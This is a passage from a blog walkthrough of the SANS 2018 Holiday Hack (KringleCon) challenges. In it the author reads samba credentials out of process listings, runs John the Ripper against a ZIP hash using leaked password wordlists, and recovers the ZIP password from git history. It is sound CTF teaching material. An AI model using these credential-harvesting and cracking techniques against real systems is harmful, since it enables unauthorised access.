&lt;span class="go"&gt;-rw-r--r-- 1 XXX XXX  46 déc.  31 16:18 0001.txt&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-rw-r--r-- 1 XXX XXX 142 déc.  31 16:18 0120.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &lt;span class="m"&gt;0120&lt;/span&gt;.txt
&lt;span class="go"&gt;{&amp;quot;success&amp;quot;:true,&amp;quot;resourceId&amp;quot;:&amp;quot;undefined&amp;quot;,&amp;quot;hash&amp;quot;:&amp;quot;0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;Correct guess!&amp;quot;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our largest file was &lt;code&gt;0120.txt&lt;/code&gt;, which gives us the correct passcode,
&lt;code&gt;0120&lt;/code&gt;, which means △□○△. Let's input this on the website:&lt;/p&gt;
&lt;img alt="door_code_correct_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_correct_guess.png" /&gt;
&lt;p&gt;This gives us the message &lt;code&gt;Welcome unprepared speaker!&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-official-solution"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id16"&gt;The &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;The name of the challenge, and Tangle Coalbox, hint at taking a look at de
Bruijn sequence. Indeed, since the code is tested every time the button is
pressed, we don't have to perform a full bruteforce attack. We can generate a
de Bruijn sequence of four symbols (length of the PIN) chosen in a set of four
symbols (the number of buttons we have). This sequence tells us which buttons
to push. Let's use &lt;a class="reference external" href="http://www.hakank.org/comb/debruijn.cgi"&gt;this website&lt;/a&gt;
to generate our sequence, with parameters &lt;span class="formula"&gt;&lt;i&gt;k&lt;/i&gt; = 4, &lt;i&gt;n&lt;/i&gt; = 4&lt;/span&gt;. The sequence is:&lt;/p&gt;
&lt;blockquote&gt;
0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 &lt;strong&gt;0 1 2 0&lt;/strong&gt; 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3&lt;/blockquote&gt;
&lt;p&gt;If we input this sequence, we get the correct code after pressing only 22
buttons.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="data-repo-analysis"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id17"&gt;Data Repo Analysis&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;After solving the last challenge, stuff begins to happen at KringleCon:&lt;/p&gt;
&lt;img alt="toy_soldier_blue.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_blue.png" /&gt;
&lt;p&gt;&lt;em&gt;Here's what's happening&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Suddenly, all elves in the castle start looking very nervous. You can
overhear some of them talking with worry in their voices.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The toy soldiers, who were always gruff, now seem especially determined as
they lock all the exterior entrances to the building and barricade all the
doors. No one can get out! And the toy soldiers' grunts take on an
increasingly sinister tone.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Uh-oh, seems like sh*t's about to go down! Let's keep solving our challenges,
maybe we'll learn more about this.&lt;/p&gt;
&lt;div class="section" id="wunorse-openslae-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id18"&gt;Wunorse Openslae's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Wunorse Openslae is supposed to upload his report to a samba share, but can't
remember the password. We're supposed to help him uploading his report:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Thank you Madam or Sir for the help that you bring!&lt;/span&gt;
&lt;span class="go"&gt;I was wondering how I might rescue my day.&lt;/span&gt;
&lt;span class="go"&gt;Finished mucking out stalls of those pulling the sleigh,&lt;/span&gt;
&lt;span class="go"&gt;My report is now due or my KRINGLE&amp;#39;s in a sling!&lt;/span&gt;
&lt;span class="go"&gt;There&amp;#39;s a samba share here on this terminal screen.&lt;/span&gt;
&lt;span class="go"&gt;What I normally do is to upload the file,&lt;/span&gt;
&lt;span class="go"&gt;With our network credentials (we&amp;#39;ve shared for a while).&lt;/span&gt;
&lt;span class="go"&gt;When I try to remember, my memory&amp;#39;s clean!&lt;/span&gt;
&lt;span class="go"&gt;Be it last night&amp;#39;s nog bender or just lack of rest,&lt;/span&gt;
&lt;span class="go"&gt;For the life of me I can&amp;#39;t send in my report.&lt;/span&gt;
&lt;span class="go"&gt;Could there be buried hints or some way to contort,&lt;/span&gt;
&lt;span class="go"&gt;Gaining access - oh please now do give it your best!&lt;/span&gt;
&lt;span class="go"&gt;-Wunorse Openslae&lt;/span&gt;
&lt;span class="go"&gt;Complete this challenge by uploading the elf&amp;#39;s report.txt&lt;/span&gt;
&lt;span class="go"&gt;file to the samba share at //localhost/report-upload/&lt;/span&gt;
&lt;span class="gp"&gt;elf@566501e7c881:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I tried the usual suspects: bash history files, looking at
&lt;code&gt;/etc/samba/smb.conf&lt;/code&gt;, looking into &lt;code&gt;/var/log&lt;/code&gt;, looking at
&lt;code&gt;cron&lt;/code&gt; files, checking what I could run with &lt;code&gt;sudo&lt;/code&gt;, etc. This did
not give anything interesting. However, the next usual suspect gave something.
I checked what was running on the server, using &lt;code&gt;ps&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@b08c86087276:~$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; less
&lt;span class="go"&gt;USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND&lt;/span&gt;
&lt;span class="go"&gt;root         1  0.0  0.0  17952  2860 pts/0    Ss   22:22   0:00 /bin/bash /sbin/init&lt;/span&gt;
&lt;span class="go"&gt;root        11  0.0  0.0  45320  3060 pts/0    S    22:22   0:00 sudo -u manager /home/manager/&lt;/span&gt;
&lt;span class="go"&gt;samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not&lt;/span&gt;
&lt;span class="go"&gt;-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;//localhost/report-upload/ directreindeerflatterystable -U report-upload&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;root        16  0.0  0.0  45320  3180 pts/0    S    22:22   0:00 sudo -u elf /bin/bash&lt;/span&gt;
&lt;span class="go"&gt;manager     18  0.0  0.0   9500  2412 pts/0    S    22:22   0:00 /bin/bash /home/manager/samba-&lt;/span&gt;
&lt;span class="go"&gt;wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-a&lt;/span&gt;
&lt;span class="go"&gt;s-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //loca&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;lhost/report-upload/ directreindeerflatterystable -U report-upload&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;elf         20  0.0  0.0  18208  3360 pts/0    S    22:22   0:00 /bin/bash&lt;/span&gt;
&lt;span class="go"&gt;root        24  0.0  0.0 316680 15420 ?        Ss   22:22   0:00 /usr/sbin/smbd&lt;/span&gt;
&lt;span class="go"&gt;root        25  0.0  0.0 308372  5704 ?        S    22:22   0:00 /usr/sbin/smbd&lt;/span&gt;
&lt;span class="go"&gt;root        26  0.0  0.0 308388  5516 ?        S    22:22   0:00 /usr/sbin/smbd&lt;/span&gt;
&lt;span class="go"&gt;root        28  0.0  0.0 316664  5868 ?        S    22:22   0:00 /usr/sbin/smbd&lt;/span&gt;
&lt;span class="go"&gt;manager     49  0.0  0.0   4196   660 pts/0    S    22:27   0:00 sleep 60&lt;/span&gt;
&lt;span class="go"&gt;elf         50  0.0  0.0  36636  2860 pts/0    R+   22:27   0:00 ps aux&lt;/span&gt;
&lt;span class="go"&gt;elf         51  0.0  0.0   6556   956 pts/0    S+   22:27   0:00 less&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It seems that some scripts of the &lt;code&gt;manager&lt;/code&gt; user are running, with a
&lt;a class="reference external" href="https://www.xkcd.com/936/"&gt;password&lt;/a&gt; given as a CLI argument. The samba
credentials seem to be &lt;code&gt;report-upload:directreindeerflatterystable&lt;/code&gt;.
Let's try them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@b08c86087276:~$&lt;/span&gt; smbclient -U report-upload //localhost/report-upload directreindeerflattery
&lt;span class="go"&gt;stable&lt;/span&gt;
&lt;span class="go"&gt;WARNING: The &amp;quot;syslog&amp;quot; option is deprecated&lt;/span&gt;
&lt;span class="go"&gt;Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]&lt;/span&gt;
&lt;span class="go"&gt;smb: \&amp;gt; put report.txt&lt;/span&gt;
&lt;span class="go"&gt;putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)&lt;/span&gt;
&lt;span class="go"&gt;smb: \&amp;gt; Terminated&lt;/span&gt;
&lt;span class="gp"&gt;elf@b08c86087276:~$&lt;/span&gt;

&lt;span class="go"&gt;                               .;;;;;;;;;;;;;;;&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;                             ,NWOkkkkkkkkkkkkkkNN;&lt;/span&gt;
&lt;span class="go"&gt;                           ..KM; Stall Mucking ,MN..&lt;/span&gt;
&lt;span class="go"&gt;                         OMNXNMd.             .oMWXXM0.&lt;/span&gt;
&lt;span class="go"&gt;                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc&lt;/span&gt;
&lt;span class="go"&gt;                        :MO                         xMl             &amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.&lt;/span&gt;
&lt;span class="go"&gt; .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;kkkkxxxxxddddddoooooooxMO   ..&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;.        xMkcccccccllllllllllooc.&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool&lt;/span&gt;
&lt;span class="go"&gt; &amp;#39;kkkkxxxxxddddddoooooooxMO   &amp;#39;::::::::::::,        xMkcccccccllllllllllool,&lt;/span&gt;
&lt;span class="go"&gt; .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;                        :MO  .ONNNNNNNNXk           xMl             :lc&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;                        :MO   dOOOOOOOOOo           xMl             ;.&lt;/span&gt;
&lt;span class="go"&gt;                        :MO   &amp;#39;cccccccccccccc:&amp;#39;     xMl&lt;/span&gt;
&lt;span class="go"&gt;                        :MO  .WMMMMMMMMMMMMMMMW.    xMl&lt;/span&gt;
&lt;span class="go"&gt;                        :MO    ...............      xMl&lt;/span&gt;
&lt;span class="go"&gt;                        .NWxddddddddddddddddddddddddNW&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;                          ;ccccccccccccccccccccccccc;&lt;/span&gt;

&lt;span class="go"&gt;You have found the credentials I just had forgot,&lt;/span&gt;
&lt;span class="go"&gt;And in doing so you&amp;#39;ve saved me trouble untold.&lt;/span&gt;
&lt;span class="go"&gt;Going forward we&amp;#39;ll leave behind policies old,&lt;/span&gt;
&lt;span class="go"&gt;Building separate accounts for each elf in the lot.&lt;/span&gt;
&lt;span class="go"&gt;-Wunorse Openslae&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wise words, Wunorse.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-git-repository"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id19"&gt;North Pole Git Repository&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're supposed to recover an encrypted ZIP file from the &lt;a class="reference external" href="https://git.kringlecastle.com/Upatree/santas_castle_automation"&gt;North Pole Git
repository&lt;/a&gt;.
Let's clone it, and investigate a little bit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
&lt;span class="go"&gt;Clonage dans &amp;#39;santas_castle_automation&amp;#39;...&lt;/span&gt;
&lt;span class="go"&gt;warning: redirection vers https://git.kringlecastle.com/Upatree/santas_castle_automation.git/&lt;/span&gt;
&lt;span class="go"&gt;remote: Enumerating objects: 949, done.&lt;/span&gt;
&lt;span class="go"&gt;remote: Counting objects: 100% (949/949), done.&lt;/span&gt;
&lt;span class="go"&gt;remote: Compressing objects: 100% (545/545), done.&lt;/span&gt;
&lt;span class="go"&gt;remote: Total 949 (delta 258), reused 879 (delta 205)&lt;/span&gt;
&lt;span class="go"&gt;Réception d&amp;#39;objets: 100% (949/949), 4.27 MiB | 5.85 MiB/s, fait.&lt;/span&gt;
&lt;span class="go"&gt;Résolution des deltas: 100% (258/258), fait.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; santas_castle_automation
&lt;span class="gp"&gt;$&lt;/span&gt; find . -name &lt;span class="s1"&gt;&amp;#39;*.zip&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;./schematics/ventilation_diagram.zip&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we have found our ZIP file. Let's try to crack the password, it worked
on previous challenges. To do so, we'll use &lt;a class="reference external" href="https://github.com/magnumripper/JohnTheRipper/"&gt;JohnTheRipper&lt;/a&gt;.
To be sure that you can crack password-protected ZIP files with
&lt;code&gt;JohnTheRIpper&lt;/code&gt;, make sure that you install &lt;code&gt;zlib&lt;/code&gt;, otherwise it's
not supported (got quite a few headaches because of this).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; zip2john ./schematics/ventilation_diagram.zip &amp;gt; ventilation_diagram_hash.txt
&lt;span class="go"&gt;ventilation_diagram.zip/ventilation_diagram/ is not encrypted!&lt;/span&gt;
&lt;span class="go"&gt;ver 1.0 ./schematics/ventilation_diagram.zip/ventilation_diagram/ is not encrypted, or stored with non-handled compression type&lt;/span&gt;
&lt;span class="go"&gt;ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_2F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=366995, decmplen=415586, crc=ACFD98A7&lt;/span&gt;
&lt;span class="go"&gt;ver 2.0 efh 5455 efh 7875 ventilation_diagram.zip/ventilation_diagram/ventilation_diagram_1F.jpg PKZIP Encr: 2b chk, TS_chk, cmplen=372752, decmplen=421604, crc=8E23EC48&lt;/span&gt;
&lt;span class="go"&gt;NOTE: It is assumed that all files in each archive have the same password.&lt;/span&gt;
&lt;span class="go"&gt;If that is not the case, the hash may be uncrackable. To avoid this, use&lt;/span&gt;
&lt;span class="go"&gt;option -o to pick a file at a time.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; john --wordlist&lt;span class="o"&gt;=&lt;/span&gt;~/SecLists/Passwords/Leaked-Databases/md5decryptor.uk.txt ./ventilation_diagram_hash.txt
&lt;span class="go"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="go"&gt;Loaded 1 password hash (PKZIP [32/64])&lt;/span&gt;
&lt;span class="go"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="go"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="go"&gt;0g 0:00:00:00 DONE (2019-01-01 22:53) 0g/s 14259Kp/s 14259Kc/s 14259KC/s 23248758..wzpxg1kn&lt;/span&gt;
&lt;span class="go"&gt;Session completed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, &lt;code&gt;john&lt;/code&gt; was unable to crack our hash. I tried several wordlists, but
to no avail. In most challenges, if there's a password cracking question, the
password will most likely be in common wordlists or leaked databases. So, let's
try something else.&lt;/p&gt;
&lt;p&gt;A Git repository can be very resourceful. Indeed, we have access to the files
and the history of modifications, commits, and such. It worked in a &lt;a class="reference external" href="https://allyourbase.utouch.fr/posts/2017/01/05/sans-christmas-challenge-2016/#the-mobile-analytics-server-post-authentication"&gt;previous
SANS Christmas challenge&lt;/a&gt;.
So, let's give it a try here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; git log -p &lt;span class="p"&gt;|&lt;/span&gt; grep -i password
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.&lt;/span&gt;
&lt;span class="go"&gt;-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!&lt;/span&gt;
&lt;span class="go"&gt;-Hopefully this is the last time we have to change our password again until next Christmas.&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-Password = &amp;#39;Yippee-ki-yay&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright! We seem to have found our password. Let's try it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; unzip -d ventilation_diagram -P Yippee-ki-yay ./schematics/ventilation_diagram.zip
&lt;span class="go"&gt;Archive:  ./schematics/ventilation_diagram.zip&lt;/span&gt;
&lt;span class="go"&gt;inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_2F.jpg&lt;/span&gt;
&lt;span class="go"&gt;inflating: ventilation_diagram/ventilation_diagram/ventilation_diagram_1F.jpg&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It worked! The password is &lt;code&gt;Yippee-ki-yay&lt;/code&gt;, and we gained access to two
files, which seem to be schematics for ventilation conducts: one for the first
floor (&lt;code&gt;1F&lt;/code&gt;) and one for the second floor (&lt;code&gt;2F&lt;/code&gt;). Maybe they'll
&lt;a class="reference external" href="https://www.youtube.com/watch?v=phs3i0onDDg"&gt;come in handy later&lt;/a&gt;...&lt;/p&gt;
&lt;img alt="ventilation_diagram_1F.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_1F.jpg" /&gt;
&lt;img alt="ventilation_diagram_2F.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_2F.jpg" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="ad-privilege-discovery"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id20"&gt;AD Privilege Discovery&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Just as we find the schematics, Hans begins his little speech:&lt;/p&gt;
&lt;img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" /&gt;
&lt;p&gt;&lt;em&gt;Hans says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;In the main lobby on the bottom floor of Santa's castle, Hans calls
everyone around to deliver a speech.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Ladies and Gentlemen…&lt;/p&gt;
&lt;p&gt;Ladies and Gentlemen…&lt;/p&gt;
&lt;p&gt;Due to the North Pole’s legacy of providing coal as presents around the
globe they are about to be taught a lesson in the real use of POWER.&lt;/p&gt;
&lt;p&gt;You will be witnesses.&lt;/p&gt;
&lt;p&gt;Now, Santa… that's a nice suit… John Philips, North Pole. I have two
myself. Rumor has it Alabaster buys his there.&lt;/p&gt;
&lt;p&gt;I have comrades in arms around the world who are languishing in prison.&lt;/p&gt;
&lt;p&gt;The Elvin State Department enjoys rattling its saber for its own ends. Now
it can rattle it for ME.&lt;/p&gt;
&lt;p&gt;The following people are to be released from their captors.&lt;/p&gt;
&lt;p&gt;In the Dungeon for Errant Reindeer, the seven members of the New Arietes
Front.&lt;/p&gt;
&lt;p&gt;In Whoville Prison, the imprisoned leader of ATNAS Corporation, Miss Cindy
Lou Who.&lt;/p&gt;
&lt;p&gt;In the Land of Oz, Glinda the Good Witch.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, Hans wants the release of the villains who tried to disrupt these past
Christmases. Well, except for the Doctor, who was pardoned. We love you,
Doctor!&lt;/p&gt;
&lt;div class="section" id="holly-evergreen-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id21"&gt;Holly Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The candy striper has stopped, and we must start it again by performing the
right &lt;code&gt;curl&lt;/code&gt; command to &lt;a class="reference external" href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;I am Holly Evergreen, and now you won&amp;#39;t believe:&lt;/span&gt;
&lt;span class="go"&gt;Once again the striper stopped; I think I might just leave!&lt;/span&gt;
&lt;span class="go"&gt;Bushy set it up to start upon a website call.&lt;/span&gt;
&lt;span class="go"&gt;Darned if I can CURL it on - my Linux skills apall.&lt;/span&gt;
&lt;span class="go"&gt;Could you be our CURLing master - fixing up this mess?&lt;/span&gt;
&lt;span class="go"&gt;If you are, there&amp;#39;s one concern you surely must address.&lt;/span&gt;
&lt;span class="go"&gt;Something&amp;#39;s off about the conf that Bushy put in place.&lt;/span&gt;
&lt;span class="go"&gt;Can you overcome this snag and save us all some face?&lt;/span&gt;
&lt;span class="go"&gt;  Complete this challenge by submitting the right HTTP&lt;/span&gt;
&lt;span class="go"&gt;  request to the server at http://localhost:8080/ to&lt;/span&gt;
&lt;span class="go"&gt;  get the candy striper started again. You may view&lt;/span&gt;
&lt;span class="go"&gt;  the contents of the nginx.conf file in&lt;/span&gt;
&lt;span class="go"&gt;  /etc/nginx/, if helpful.&lt;/span&gt;
&lt;span class="gp"&gt;elf@451e98e0a27c:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's start with something simple:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@44672f31f7a9:~$&lt;/span&gt; curl http://localhost:8080/
&lt;span class="go"&gt;   ����&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, nothing useful. I took a look at &lt;code&gt;/etc/nginx/sites-enabled/default&lt;/code&gt;
(the only enabled file), but nothing interesting. I then tried to take a look
at several configuration file (&lt;code&gt;/etc/nginx/snippets/fastcgi-php.conf&lt;/code&gt;,
&lt;code&gt;/etc/nginx/fastcgi.conf&lt;/code&gt;, &lt;code&gt;/etc/php/7.0/fpm/php-fpm.conf&lt;/code&gt;, etc.),
but nothing interesting. I then realized that the prompt tells us to look at
&lt;code&gt;/etc/nginx/nginx.conf&lt;/code&gt; 🤦‍♂️. Anyway, let's take a look:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@44672f31f7a9:/etc/nginx$&lt;/span&gt; cat nginx.conf
&lt;span class="go"&gt;user www-data;&lt;/span&gt;
&lt;span class="go"&gt;worker_processes auto;&lt;/span&gt;
&lt;span class="go"&gt;pid /run/nginx.pid;&lt;/span&gt;
&lt;span class="go"&gt;include /etc/nginx/modules-enabled/*.conf;&lt;/span&gt;
&lt;span class="go"&gt;events {&lt;/span&gt;
&lt;span class="go"&gt;        worker_connections 768;&lt;/span&gt;
&lt;span class="gp"&gt;        #&lt;/span&gt; multi_accept on&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;http {&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;        server {&lt;/span&gt;
&lt;span class="gp"&gt;        #&lt;/span&gt; love using the new stuff! -Bushy
&lt;span class="hll"&gt;&lt;span class="go"&gt;                listen                  8080 http2;&lt;/span&gt;
&lt;/span&gt;&lt;span class="gp"&gt;                #&lt;/span&gt; server_name           localhost &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="go"&gt;                root /var/www/html;&lt;/span&gt;
&lt;span class="go"&gt;                location ~ [^/]\.php(/|$) {&lt;/span&gt;
&lt;span class="go"&gt;                    fastcgi_split_path_info ^(.+?\.php)(/.*)$;&lt;/span&gt;
&lt;span class="go"&gt;                    if (!-f $document_root$fastcgi_script_name) {&lt;/span&gt;
&lt;span class="go"&gt;                        return 404;&lt;/span&gt;
&lt;span class="go"&gt;                    }&lt;/span&gt;
&lt;span class="gp"&gt;                    #&lt;/span&gt; Mitigate https://httpoxy.org/ vulnerabilities
&lt;span class="go"&gt;                    fastcgi_param HTTP_PROXY &amp;quot;&amp;quot;;&lt;/span&gt;
&lt;span class="gp"&gt;                    #&lt;/span&gt; SCRIPT_FILENAME parameter is used &lt;span class="k"&gt;for&lt;/span&gt; PHP FPM determining

&lt;span class="gp"&gt;                    #&lt;/span&gt; fastcgi_pass &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:9000&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="go"&gt;                    fastcgi_pass unix:/var/run/php/php-fpm.sock;&lt;/span&gt;
&lt;span class="go"&gt;                    fastcgi_index index.php;&lt;/span&gt;

&lt;span class="gp"&gt;                    #&lt;/span&gt; include the fastcgi_param setting
&lt;span class="go"&gt;                    include fastcgi_params;&lt;/span&gt;

&lt;span class="gp"&gt;                    #&lt;/span&gt; SCRIPT_FILENAME parameter is used &lt;span class="k"&gt;for&lt;/span&gt; PHP FPM determining
&lt;span class="gp"&gt;                    #&lt;/span&gt;  the script name. If it is not &lt;span class="nb"&gt;set&lt;/span&gt; in fastcgi_params file,
&lt;span class="gp"&gt;                    #&lt;/span&gt; i.e. /etc/nginx/fastcgi_params or in the parent contexts,
&lt;span class="gp"&gt;                    #&lt;/span&gt; please comment off following line:
&lt;span class="gp"&gt;                    #&lt;/span&gt; fastcgi_param  SCRIPT_FILENAME   &lt;span class="nv"&gt;$document_root$fastcgi_script_name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="go"&gt;                }&lt;/span&gt;

&lt;span class="go"&gt;                }&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ah! The webserver is configured to use HTTP/2. We take a look at &lt;code&gt;curl&lt;/code&gt;'s
&lt;code&gt;man&lt;/code&gt; page, and we find the &lt;code&gt;--http2&lt;/code&gt; option. Let's try it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@44672f31f7a9:/etc/nginx$&lt;/span&gt; curl --http2 http://localhost:8080/
&lt;span class="go"&gt;   ����&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, same result as before. I then tried several options, regarding the
compression, and other stuff, but it didn't work. Out of frustration, I tried
another HTTP/2 option, to wit &lt;code&gt;--http2-prior-knowledge&lt;/code&gt;:&lt;/p&gt;
